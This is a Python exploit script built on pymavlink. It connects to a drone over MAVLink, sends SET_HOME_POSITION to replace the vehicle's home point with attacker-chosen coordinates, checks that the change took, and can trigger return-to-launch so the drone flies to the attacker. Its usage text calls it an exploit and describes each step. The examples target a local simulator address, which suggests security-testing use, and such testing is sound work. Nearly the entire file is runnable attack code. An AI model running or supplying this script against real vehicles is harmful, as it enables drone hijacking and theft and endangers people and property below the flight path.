#!/usr/bin/env python3
"""
Return to Home Override Exploit Script
Changes home position to cause drone to return to attacker location
"""

import sys
import time
from pymavlink import mavutil

def set_home_position(connection, lat, lon, alt):
    """
    Set home position to specified coordinates
    
    Args:
        connection: MAVLink connection object
        lat: Latitude in degrees
        lon: Longitude in degrees
        alt: Altitude in meters
    """
    target_system = connection.target_system
    target_component = connection.target_component
    
    # Convert to MAVLink format
    lat_int = int(lat * 1e7)
    lon_int = int(lon * 1e7)
    alt_int = int(alt * 1000)  # Altitude in millimeters
    
    print(f"[*] Setting home position to: lat={lat}, lon={lon}, alt={alt}m")
    
    # Send SET_HOME_POSITION message
    connection.mav.set_home_position_send(
        target_system,
        lat_int,
        lon_int,
        alt_int,
        0, 0, 0,  # x, y, z (local frame, set to 0)
        0, 0, 0, 0, 0, 0, 0  # q (quaternion, set to 0 for simplicity)
    )
    
    time.sleep(0.5)
    print("[+] Home position set")
    
    # Verify by requesting home position
    connection.mav.command_long_send(
        target_system,
        target_component,
        mavutil.mavlink.MAV_CMD_REQUEST_MESSAGE,
        0,
        mavutil.mavlink.MAVLINK_MSG_ID_HOME_POSITION,
        0, 0, 0, 0, 0, 0
    )
    
    time.sleep(0.5)
    msg = connection.recv_match(type='HOME_POSITION', blocking=True, timeout=2)
    if msg:
        received_lat = msg.latitude / 1e7
        received_lon = msg.longitude / 1e7
        print(f"[+] Verified home position: lat={received_lat}, lon={received_lon}")
        return True
    
    return False

def trigger_return_to_home(connection):
    """
    Trigger return-to-home command
    
    Args:
        connection: MAVLink connection object
    """
    target_system = connection.target_system
    target_component = connection.target_component
    
    print("[*] Triggering return-to-home...")
    
    # Send return-to-launch command
    connection.mav.command_long_send(
        target_system,
        target_component,
        mavutil.mavlink.MAV_CMD_NAV_RETURN_TO_LAUNCH,
        0, 0, 0, 0, 0, 0, 0, 0
    )
    
    time.sleep(1)
    
    # Check for acknowledgment
    msg = connection.recv_match(type='COMMAND_ACK', blocking=True, timeout=2)
    if msg:
        if msg.result == mavutil.mavlink.MAV_RESULT_ACCEPTED:
            print("[+] Return-to-home command accepted")
            return True
        else:
            print(f"[-] Return-to-home command rejected: {msg.result}")
            return False
    
    print("[!] No acknowledgment received")
    return False

def main():
    if len(sys.argv) < 5:
        print("Usage: python3 return_to_home_override.py <connection> <lat> <lon> <alt> [trigger-rtl]")
        print("Example: python3 return_to_home_override.py udp:127.0.0.1:14550 37.7749 -122.4194 100")
        print("Example: python3 return_to_home_override.py udp:127.0.0.1:14550 37.7749 -122.4194 100 --trigger")
        print("\nThis exploit:")
        print("  1. Changes home position to attacker-specified location")
        print("  2. Optionally triggers return-to-home")
        print("  3. Drone will return to new home location instead of original")
        sys.exit(1)
    
    connection_string = sys.argv[1]
    
    # Validate and parse coordinates
    try:
        lat = float(sys.argv[2])
        if not -90 <= lat <= 90:
            raise ValueError("Latitude must be between -90 and 90 degrees")
    except (ValueError, IndexError) as e:
        print(f"[-] Invalid latitude: {e}")
        sys.exit(1)
    
    try:
        lon = float(sys.argv[3])
        if not -180 <= lon <= 180:
            raise ValueError("Longitude must be between -180 and 180 degrees")
    except (ValueError, IndexError) as e:
        print(f"[-] Invalid longitude: {e}")
        sys.exit(1)
    
    try:
        alt = float(sys.argv[4])
        if not -500 <= alt <= 50000:
            raise ValueError("Altitude must be between -500 and 50000 meters")
    except (ValueError, IndexError) as e:
        print(f"[-] Invalid altitude: {e}")
        sys.exit(1)
    
    trigger_rtl = '--trigger' in sys.argv or 'trigger-rtl' in sys.argv
    
    # Use helper function for connection
    import sys
    from pathlib import Path
    sys.path.insert(0, str(Path(__file__).parent.parent / 'utils'))
    from mavlink_helper import connect_to_drone
    
    print(f"[*] Connecting to {connection_string}...")
    connection = connect_to_drone(connection_string, timeout=5)
    if connection is None:
        sys.exit(1)
    print("[+] Connected to vehicle")
    
    # Set home position
    success = set_home_position(connection, lat, lon, alt)
    
    if success:
        print("[+] Home position override successful")
        
        if trigger_rtl:
            # Trigger return-to-home
            trigger_return_to_home(connection)
            print("[+] Drone will return to new home position")
        else:
            print("[*] Home position changed. Use RTL command to trigger return.")
    else:
        print("[-] Failed to set home position")
        sys.exit(1)

if __name__ == "__main__":
    main()
